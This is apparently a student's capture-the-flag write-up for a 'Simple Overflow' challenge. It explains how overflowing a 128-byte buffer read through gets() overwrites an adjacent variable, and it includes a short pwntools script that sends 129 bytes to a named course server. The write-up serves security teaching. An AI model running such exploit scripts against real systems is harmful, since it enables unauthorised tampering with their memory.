# Challenge `Simple Overflow` writeup

- Vulnerability:
  - Buffer Overflow
- Where: Where is the vulnerability present
  - `mustard.stt.rnl.tecnico.ulisboa.pt` on port `23151`
- Impact:
  - Allows attacker to alter local variable

## Steps to reproduce

1. The `buffer` and `test` variables are reserved consecutively
2. By writing more that 128 characters into `buffer`, the `test` variable is affected, after the `gets` function.

The code used was:

```py
from pwn import *

session = remote("mustard.stt.rnl.tecnico.ulisboa.pt", "23151", timeout=1000)
session.recvuntil('.')
session.send(b'1'*129)
print(session.recvall())
```